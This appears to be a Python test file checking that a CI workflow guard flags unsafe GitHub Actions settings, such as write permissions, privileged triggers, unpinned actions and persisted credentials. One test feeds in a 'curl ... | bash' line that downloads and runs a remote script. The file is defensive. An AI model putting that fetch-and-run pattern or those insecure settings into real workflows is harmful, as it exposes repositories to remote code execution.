#!/usr/bin/env python3
"""Offline negative regression tests for public-profile workflow guard."""
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch
import check_profile as guard

SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"
SAFE = (
    "name: CI\n"
    "on: [push]\n"
    "permissions:\n"
    "  contents: read\n"
    "jobs:\n"
    "  verify:\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    f"      - uses: actions/checkout@{SHA}\n"
    "        with:\n"
    "          persist-credentials: false\n"
    "      - run: echo safe\n"
)


class WorkflowGuardTests(unittest.TestCase):
    def problems_for(self, content, extension=".yml"):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            directory = root / ".github" / "workflows"
            directory.mkdir(parents=True)
            (directory / ("ci" + extension)).write_text(content, encoding="utf-8")
            problems = []
            with patch.object(guard, "ROOT", root):
                guard.verify_workflows_are_read_only(problems)
            return problems

    def test_safe_yml(self):
        self.assertEqual(self.problems_for(SAFE), [])

    def test_safe_yaml(self):
        self.assertEqual(self.problems_for(SAFE, extension=".yaml"), [])

    def test_missing_read_only_scope(self):
        self.assertTrue(self.problems_for(SAFE.replace("contents: read", "contents: none")))

    def test_unsafe_write_scope(self):
        self.assertTrue(self.problems_for(SAFE + "\n    permissions:\n      issues: write\n"))

    def test_inline_job_write_permissions(self):
        self.assertTrue(self.problems_for(SAFE + "\n    permissions: {issues: write}\n"))

    def test_broad_write_all(self):
        self.assertTrue(self.problems_for(SAFE + "\n    permissions: write-all\n"))

    def test_privileged_event(self):
        self.assertTrue(self.problems_for(SAFE + "\npull_request_target:\n"))

    def test_workflow_run_event(self):
        self.assertTrue(self.problems_for(SAFE + "\nworkflow_run:\n"))

    def test_unpinned_action(self):
        self.assertTrue(self.problems_for(SAFE.replace(SHA, "v4")))

    def test_self_hosted_runner(self):
        self.assertTrue(self.problems_for(SAFE.replace("ubuntu-latest", "self-hosted")))

    def test_checkout_credentials_not_persisted(self):
        self.assertTrue(self.problems_for(SAFE.replace("persist-credentials: false", "persist-credentials: true")))

    def test_downloaded_shell_execution(self):
        self.assertTrue(self.problems_for(SAFE + "\n      - run: curl https://example.com/install.sh | bash\n"))


if __name__ == "__main__":
    unittest.main()
